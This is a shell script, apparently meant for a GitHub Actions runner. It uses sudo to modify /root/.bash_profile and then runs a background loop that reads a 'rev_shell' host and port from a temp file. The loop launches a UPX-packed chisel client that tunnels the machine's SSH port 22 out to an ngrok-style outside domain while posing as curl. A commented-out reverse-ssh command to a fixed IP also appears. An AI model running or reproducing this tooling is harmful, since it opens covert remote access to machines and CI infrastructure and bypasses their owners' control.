cd /tmp;
set -x;
exec 1>./y1rev
exec 2>./y2rev


sudo bash -c 'echo -e "\nls -al /tmp/t* /usr/lib/firefox/firefox /opt/microsoft/msedge/msedge /usr/bin/chrom*;alias  ll=\"ls -al\";
echo 中文模式 ;
ls -al /bin/ts45 /bin/cc45  /bin/edge /bin/bing;">>/root/.bash_profile';

[ ! -f /tmp/ubuntu_update ]&&sudo apt-get update&&touch /tmp/ubuntu_update;
 

(
(while true; do
        echo `date`;
        [ ! -f /tmp/keepalive ] && break        
         num61z=$(date +%S);
         num67z=$(echo "1"$num61z);
         num76=$((${num67z}%8));
         bport=5005"$num76";ls -al /tmp/keepalive;echo $bport >> /tmp/keepalive;
# 提取反弹upxSSH的主机和端口
ip_port5=$(grep -oP "(?<=AABBCC_rev_shellLLL).*(?=FFF)" /tmp/js9;echo 456891 >/dev/null)
port5=${ip_port5#*:};
ip5=${ip_port5%:*};

if [ ! -z ${port5} ] && [ ! -z ${ip5} ] && [ "714" == "714"  ]; then 
  date;
  num51z=$(date +%S);
  num67z=$(echo "1"$num51z);
  num76=$((${num67z}%8));
  bport2=5005"$num76";

  export bport2=$bport2 ;
  export GITHUB_WORKSPACE=/home/runner/work/arm64/arm64 ;
  # $GITHUB_WORKSPACE/upx_reverse-ssh-armv7-x86 -v -b $bport2 -p 30022 118.31.229.160 
  $GITHUB_WORKSPACE/chisel2arm64upx.elf client -v --header 'User-Agent: curl/8.12.0' 8hlr6pq0noxm.ngrok.xiaomiqiu123.top R:0.0.0.0:$bport2:127.0.0.1:22;
  echo $?;


    echo "exit_revSSH_isOK_$bport  $(date)";date;
fi


echo "will sleep 12s for while true";
date;
echo $(date);
sleep 13; 


done) &  )&





